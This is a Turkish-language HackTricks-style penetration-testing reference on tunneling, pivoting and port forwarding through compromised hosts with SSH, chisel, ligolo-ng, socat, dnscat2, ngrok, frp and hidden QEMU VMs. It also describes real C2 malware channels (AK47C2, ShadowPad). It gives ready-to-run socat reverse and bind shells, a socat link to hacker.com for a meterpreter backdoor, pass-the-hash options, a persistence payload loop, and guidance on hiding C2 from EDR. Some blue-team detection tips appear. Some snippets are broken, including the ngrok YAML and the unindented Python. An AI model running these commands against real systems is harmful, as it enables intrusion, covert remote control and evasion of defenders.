# Tünelleme ve Port Yönlendirme

{{#include ../banners/hacktricks-training.md}}

## Nmap ipucu

> [!WARNING]
> **ICMP** ve **SYN** taramaları socks proxy'leri üzerinden tünellenemez; bu nedenle **ping discovery**'yi devre dışı bırakmalı (`-Pn`) ve bunun çalışması için **TCP taramaları** (`-sT`) belirtmeliyiz.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH grafiksel bağlantısı (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

SSH Server'da yeni Port aç --> Diğer port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Yerel port --> Ele geçirilmiş host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Yerel Port --> Ele geçirilmiş host (SSH) --> Herhangi bir yer
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Bu, DMZ üzerinden iç hostlardan hostunuza reverse shells almak için kullanışlıdır:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

**Her iki cihazda da root** yetkisine sahip olmanız gerekir (yeni interface'ler oluşturacağınız için) ve sshd yapılandırması root girişine izin vermelidir:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Sunucu tarafında yönlendirmeyi etkinleştirin
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
İstemci tarafında yeni bir route ayarlayın
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> 2023 Terrapin downgrade attack'i, man-in-the-middle saldırganının SSH handshake'inin ilk aşamasını değiştirmesine ve **herhangi bir forwarded channel**'a ( `-L`, `-R`, `-D` ) veri enjekte etmesine olanak sağlayabilir. SSH tünellerine güvenmeden önce hem client hem de server'ın patch'lendiğinden (**OpenSSH ≥ 9.6/LibreSSH 6.7**) emin olun veya `sshd_config`/`ssh_config` içinde güvenlik açığı bulunan `chacha20-poly1305@openssh.com` ve `*-etm@openssh.com` algoritmalarını açıkça devre dışı bırakın.

## SSHUTTLE

Bir host üzerinden bir **subnetwork**'e giden tüm **traffic**'i **ssh** aracılığıyla **tunnel** edebilirsiniz.\
Örneğin, 10.10.10.0/24 adresine giden tüm traffic'i yönlendirmek için
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Özel anahtarla bağlanın
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Yerel port --> Ele geçirilmiş host (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Başka bir yol:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

**Trafiği beacon üzerinden yönlendirmek** için kullanılabilecek tüm arayüzlerde dinleme yapan teamserver üzerinde bir port açın.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> Bu durumda **port beacon host üzerinde açılır**, Team Server üzerinde değil; trafik Team Server'a gönderilir ve oradan belirtilen host:port'a iletilir.
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Not:

- Beacon'ın reverse port forward özelliği, **bireysel makineler arasında relay yapmak için değil, Team Server'a traffic tunnel etmek için tasarlanmıştır**.
- Traffic, P2P bağlantıları da dahil olmak üzere **Beacon'ın C2 traffic'i içinde tunnel edilir**.
- High port'larda reverse port forward oluşturmak için **Admin yetkileri gerekmez**.

### rPort2Port local

> [!WARNING]
> Bu durumda **port, Team Server'da değil beacon host'unda açılır** ve **traffic, Team Server'a değil Cobalt Strike client'ına gönderilir**; oradan da belirtilen host:port'a iletilir.
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Bir web file tunnel yüklemeniz gerekir: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Bunu [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) adresindeki releases sayfasından indirebilirsiniz\
Client ve server için **aynı sürümü kullanmanız gerekir**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port yönlendirme
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Agent ve proxy için aynı sürümü kullanın**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent Binding ve Listening
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Agent'ın Yerel Portlarına Erişim
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. Tünel victim tarafından başlatılır.\
127.0.0.1:1080 üzerinde bir socks4 proxy oluşturulur
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM proxy** üzerinden Pivot
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port socks üzerinden
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL Socat Üzerinden Meterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Kurbanın konsolunda son satırın yerine bu satırı çalıştırarak **kimlik doğrulaması gerektirmeyen bir proxy** üzerinden geçiş yapabilirsiniz:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tüneli

**/bin/sh konsolu**

Her iki tarafta da sertifikalar oluşturun: Client ve Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Yerel SSH portunu saldırgan hostunun 443 portuna bağlayın
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Konsol tabanlı bir PuTTY sürümü gibidir (seçenekleri bir ssh client'ın seçeneklerine çok benzerdir).

Bu binary victim üzerinde çalıştırılacağından ve bir ssh client olduğundan, reverse connection alabilmek için ssh service ve port'umuzu açmamız gerekir. Ardından yalnızca local olarak erişilebilen bir portu kendi makinemizdeki bir porta forward etmek için:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Herhangi bir port için local admin olmanız gerekir
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Sistem üzerinden **RDP erişiminizin** olması gerekir.\
İndirin:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Bu araç, Windows'un Remote Desktop Service özelliğindeki `Dynamic Virtual Channels` (`DVC`) özelliğini kullanır. DVC, **paketlerin RDP bağlantısı üzerinden tünellenmesinden** sorumludur.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

İstemci bilgisayarınızda **`SocksOverRDP-Plugin.dll`** dosyasını aşağıdaki gibi yükleyin:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Artık **`mstsc.exe`** kullanarak **RDP** üzerinden **hedefe** **bağlanabiliriz**; **SocksOverRDP plugin**'inin etkin olduğunu belirten bir **istem** almalıyız ve plugin **127.0.0.1:1080** üzerinde **dinleme** yapacaktır.

**RDP** üzerinden **bağlanın** ve `SocksOverRDP-Server.exe` binary'sini hedef makineye yükleyip çalıştırın:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Şimdi, makinenizde (saldırgan) 1080 portunun dinlemede olduğunu doğrulayın:
```
netstat -antb | findstr 1080
```
Artık trafiği bu port üzerinden proxy'lemek için [**Proxifier**](https://www.proxifier.com/) kullanabilirsiniz.

## Windows GUI Uygulamalarını Proxify Etme

[**Proxifier**](https://www.proxifier.com/) kullanarak Windows GUI uygulamalarının bir proxy üzerinden gezinmesini sağlayabilirsiniz.\
**Profile -> Proxy Servers** bölümüne SOCKS sunucusunun IP adresini ve portunu ekleyin.\
**Profile -> Proxification Rules** bölümüne proxify edilecek programın adını ve proxify etmek istediğiniz IP'lere yapılacak bağlantıları ekleyin.

## NTLM proxy bypass

Daha önce bahsedilen araç: **Rpivot**\
**OpenVPN** de yapılandırma dosyasında şu seçenekleri ayarlayarak bunu bypass edebilir:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Bir proxy'ye karşı kimlik doğrulaması yapar ve belirttiğiniz harici service'e yönlendirilen bir portu yerel olarak bind eder. Ardından, seçtiğiniz tool'u bu port üzerinden kullanabilirsiniz.\
Örneğin 443 portunu yönlendirmek için
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Şimdi, örneğin kurban üzerindeki **SSH** hizmetini 443 portunu dinleyecek şekilde ayarlarsanız, ona saldırganın 2222 portu üzerinden bağlanabilirsiniz.\
Ayrıca localhost:443'e bağlanan bir **meterpreter** kullanabilir ve saldırgan tarafında 2222 portunu dinleyebilirsiniz.

## YARP

Microsoft tarafından oluşturulmuş bir reverse proxy. Burada bulabilirsiniz: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Her iki sistemde de tun adapter'ları oluşturmak ve DNS sorgularını kullanarak aralarında veri tünellemek için Root yetkisi gerekir.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Tünel çok yavaş olacaktır. Bu tünel üzerinden şu komutu kullanarak sıkıştırılmış bir SSH bağlantısı oluşturabilirsiniz:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Buradan indirin**](https://github.com/iagox86/dnscat2)**.**

DNS üzerinden bir C\&C kanalı oluşturur. Root yetkilerine ihtiyaç duymaz.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShell'de**

PowerShell'de bir dnscat2 client çalıştırmak için [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kullanabilirsiniz:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscat ile Port forwarding**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### proxychains DNS'ini değiştirme

Proxychains, `gethostbyname` libc çağrısını yakalar ve tcp DNS isteğini socks proxy üzerinden tüneller. **Varsayılan olarak**, proxychains'in kullandığı **DNS** sunucusu **4.2.2.2**'dir (hardcoded). Bunu değiştirmek için şu dosyayı düzenleyin: _/usr/lib/proxychains3/proxyresolv_ ve IP'yi değiştirin. **Windows ortamındaysanız**, **domain controller** IP'sini ayarlayabilirsiniz.

## Go'da Tüneller

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 aktörü, kurumsal ağlarda nadiren engellenen iki protokol olan yalnızca giden **DNS** ve **plain HTTP POST** trafiğini kötüye kullanan **dual-channel C2 ("AK47C2")** oluşturdu.<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• Rastgele 5 karakterlik bir SessionID üretir (ör. `H4T14`).
• *task requests* için `1` veya *results* için `2` ekler ve farklı alanları (flags, SessionID, computer name) birleştirir.
• Her alan, ASCII anahtarı `VHBD@H` ile **XOR-encrypted** edilir, hex-encoded hale getirilir ve noktalarla birleştirilir – son olarak attacker-controlled domain ile biter:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• İstekler **TXT** (ve fallback olarak **MG**) kayıtları için `DnsQuery()` kullanır.
• Yanıt 0xFF byte'ı aştığında backdoor, veriyi 63 byte'lık parçalara **fragments** eder ve C2 server'ın bunları yeniden sıralayabilmesi için şu marker'ları ekler:
`s<SessionID>t<TOTAL>p<POS>`

2. **HTTP mode (AK47HTTP)**
• Bir JSON envelope oluşturur:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Blob'un tamamı XOR-`VHBD@H` → hex → `Content-Type: text/plain` header'ına sahip bir **`POST /`** isteğinin body'si olarak gönderilir.
• Yanıt aynı encoding'i kullanır ve `cmd` alanı `cmd.exe /c <command> 2>&1` ile çalıştırılır.

Blue Team notes
• İlk label'ı uzun hexadecimal olan ve her zaman nadir kullanılan tek bir domain ile biten olağandışı **TXT queries** arayın.
• Sabit bir XOR key ve ardından ASCII-hex kullanılması YARA ile kolayca tespit edilebilir: `6?56484244?484` (`VHBD@H` hex olarak).
• HTTP için, pure hex olan ve byte sayısı two'nun katı olan text/plain POST body'lerini işaretleyin.

{{#note}}
Kanalın tamamı **standard RFC-compliant queries** içine sığar ve her sub-domain label'ını 63 byte'ın altında tutar; bu da onu çoğu DNS log'unda stealthy hale getirir.
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Her iki sistemde de tun adapter'ları oluşturmak ve ICMP echo requests kullanarak aralarında veri tünellemek için root gerekir.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Buradan indirin**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **çözümleri tek bir komut satırıyla Internet'e açan bir tool'dur.**\
_Yayınlama URI'leri şöyledir:_ **UID.ngrok.io**

### Installation

- Bir account oluşturun: https://ngrok.com/signup
- Client download:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Temel kullanımlar

**Dokümantasyon:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Gerekirse authentication ve TLS eklemek de mümkündür._

#### TCP tünelleme
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Dosyaları HTTP ile açığa çıkarma
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP çağrıları

_XSS,SSRF,SSTI ... için kullanışlıdır_\
Doğrudan stdout üzerinden veya HTTP arayüzünde [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Dahili HTTP servisi için Tunneling
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml basit yapılandırma örneği

3 tünel açar:

- 2 TCP
- /tmp/httpbin/ konumundaki statik dosyaların sunulduğu 1 HTTP
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare’ın `cloudflared` daemon’ı, Cloudflare’ın edge’ini rendez-vous noktası olarak kullanarak, inbound firewall kuralları gerektirmeden **local TCP/UDP services** sunan outbound tüneller oluşturabilir. Bu, egress firewall yalnızca HTTPS trafiğine izin veriyor ancak inbound bağlantılar engelleniyorsa oldukça kullanışlıdır.

### Hızlı tünel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### DNS ile kalıcı tüneller
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Connector'ı başlat:
```bash
cloudflared tunnel run mytunnel
```
Tüm trafik **443 üzerinden outbound** olarak host'tan çıktığı için Cloudflared tunnels, ingress ACL'lerini veya NAT sınırlarını aşmanın basit bir yoludur. Binary genellikle elevated privileges ile çalışır; mümkün olduğunda container'ları veya `--user` flag'ini kullanın.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp), **TCP, UDP, HTTP/S, SOCKS ve P2P NAT-hole-punching** desteği sunan ve aktif olarak sürdürülen bir Go reverse-proxy'dir. **v0.53.0 (Mayıs 2024)** sürümünden itibaren **SSH Tunnel Gateway** olarak çalışabilir; böylece bir target host, ekstra bir binary gerektirmeden yalnızca stock OpenSSH client kullanarak reverse tunnel oluşturabilir.

### Klasik reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Yeni SSH gateway'i kullanma (frpc binary'si olmadan)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Yukarıdaki komut, ek bir araç dağıtmadan victim’ın **8080** portunu **attacker_ip:9000** olarak yayımlar – living-off-the-land pivoting için idealdir.

## QEMU ile Gizli VM-based Tunnels

QEMU’nun user-mode networking (`-netdev user`) özelliği, **host üzerinde bir TCP/UDP portunu bağlayan ve bu portu guest içine yönlendiren** `hostfwd` adlı bir seçeneği destekler. Guest tam bir SSH daemon çalıştırdığında, hostfwd kuralı size tamamen ephemeral bir VM içinde çalışan, disposable bir SSH jump box sağlar – tüm kötü amaçlı etkinlikler ve dosyalar virtual disk içinde kaldığından C2 trafiğini EDR’dan gizlemek için mükemmeldir.<sup>[[1]](#references)</sup>

### Hızlı one-liner
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Yukarıdaki komut, **Tiny Core Linux** imajını (`tc.qcow2`) RAM'de başlatır.
• Windows host üzerindeki **2222/tcp** portu, guest içindeki **22/tcp** portuna şeffaf şekilde yönlendirilir.
• Saldırganın bakış açısından hedef yalnızca 2222 portunu açığa çıkarır; bu porta ulaşan tüm paketler VM'de çalışan SSH server tarafından işlenir.

### VBScript üzerinden gizli şekilde başlatma
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
`cscript.exe //B update.vbs` ile script'i çalıştırmak pencereyi gizli tutar.

### Guest içi kalıcılık

Tiny Core stateless olduğu için saldırganlar genellikle:

1. Payload'u `/opt/123.out` konumuna bırakır.
2. `/opt/bootlocal.sh` dosyasının sonuna şunu ekler:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Payload'un kapanış sırasında `mydata.tgz` içine paketlenmesi için `home/tc` ve `opt` dizinlerini `/opt/filetool.lst` dosyasına ekler.

### Bunun tespitten kaçmasının nedeni

• Yalnızca iki unsigned executable (`qemu-system-*.exe`) diske dokunur; driver veya service kurulmaz.  
• Host üzerindeki security product'lar **benign loopback traffic** görür (gerçek C2, VM içinde sonlanır).  
• Memory scanner'lar malicious process space'i hiçbir zaman analiz etmez, çünkü bu alan farklı bir OS içinde bulunur.

### Defender ipuçları

• User-writable path'lerde bulunan **beklenmeyen QEMU/VirtualBox/KVM binary'leri** için alert oluşturun.  
• `qemu-system*.exe` kaynaklı outbound connection'ları engelleyin.  
• QEMU launch işleminden hemen sonra bind edilen nadir listening port'ları (2222, 10022, …) araştırın.

## `HttpAddUrl` üzerinden IIS/HTTP.sys relay node'ları (ShadowPad)

Ink Dragon'ın ShadowPad IIS module'ü, covert URL prefix'lerini doğrudan HTTP.sys layer'ında bind ederek her compromised perimeter web server'ı çift amaçlı bir **backdoor + relay** haline getirir:<sup>[[3]](#references)</sup>

* **Config defaults** – module'ün JSON config'i değerleri içermiyorsa, makul IIS default'larına geri döner (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Böylece benign traffic, doğru branding ile IIS tarafından yanıtlanır.
* **Wildcard interception** – operator'ler URL prefix'lerinin noktalı virgülle ayrılmış bir listesini sağlar (host + path içinde wildcard'lar). Module her entry için `HttpAddUrl` çağırır; böylece HTTP.sys, eşleşen request'leri request IIS module'lerine ulaşmadan önce malicious handler'a yönlendirir.
* **Encrypted first packet** – request body'nin ilk iki byte'ı custom 32-bit PRNG için seed'i taşır. Protocol parsing öncesinde sonraki her byte, oluşturulan keystream ile XOR-edilir:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

